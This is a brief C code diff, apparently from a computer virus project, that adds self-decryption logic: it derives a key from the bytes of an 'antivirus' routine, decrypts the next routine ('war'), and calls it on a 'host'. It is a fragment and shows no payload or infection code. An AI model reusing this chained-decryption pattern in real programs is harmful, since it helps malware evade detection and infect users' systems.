@@ -89,6 +89,9 @@ label:
 
 	if (context == ABORT)
 		execution(host, keychain, context);
-	else
-		init(host, keychain, context);
+
+	update_keychain_left(keychain, (char *)antivirus, (void *)war - (void *)antivirus);
+	decrypt_left(keychain, (char *)war, (void *)find_host - (void *)war);
+
+	war(host, keychain, context);
 }
